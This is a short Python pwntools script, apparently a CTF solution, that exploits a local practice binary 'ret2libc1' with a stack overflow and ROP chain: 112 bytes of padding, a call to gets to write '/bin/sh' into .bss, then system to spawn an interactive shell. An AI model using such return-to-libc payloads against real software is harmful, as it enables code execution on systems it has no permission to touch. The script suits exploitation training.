#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

bss_addr = 0x0804a040
sys_addr = 0x08048490
gets_addr = 0x08048460
pop_ret = 0x0804843d

payload = flat(['a' * 112, gets_addr, pop_ret, bss_addr, sys_addr, 0xdeadbeef, bss_addr])

io = process("./ret2libc1")
io.sendline(payload)
io.sendline("/bin/sh")
io.interactive()
io.close()
